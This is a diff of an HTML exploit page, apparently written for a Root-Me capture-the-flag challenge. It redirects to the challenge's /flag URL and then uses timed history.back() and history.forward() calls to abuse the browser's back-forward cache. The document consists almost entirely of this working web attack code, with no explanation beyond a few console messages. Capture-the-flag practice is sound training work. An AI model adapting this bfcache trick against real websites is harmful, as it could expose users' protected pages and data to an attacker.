@@ -3,23 +3,40 @@
 <head>
   <meta charset="utf-8">
   <script>
-    // test
+    let visitedFlag = false;
+    
     window.addEventListener('load', () => {
-   
-      history.pushState({}, '', '/');
-      
 
+      history.pushState({}, '', '/prepare');
+      
+      // Timing parfait
       setTimeout(() => {
+        visitedFlag = true;
         location.href = 'http://challenge01.root-me.org:58007/flag';
       }, 500);
+    });
+
+    window.addEventListener('pageshow', (event) => {
+      if (visitedFlag && event.persisted) {
+
+        console.log('BFCACHE HIT!');
+        return;
+      }
+      
+      if (visitedFlag) {
+
+        setTimeout(() => {
+          history.back();  
+        }, 800);
+        
+        setTimeout(() => {
+          history.forward();  
+        }, 1200);
+      }
     });
   </script>
 </head>
 <body style="background:black;color:lime;font-size:30px;">
-  <div style="position:fixed;top:10px;left:10px;background:rgba(0,0,0,0.8);padding:10px;">
-    <h1>FINAL BFCACHE</h1>
-  </div>
+  <h1>BACK-FORWARD TRICK</h1>
 </body>
 </html>
-
-
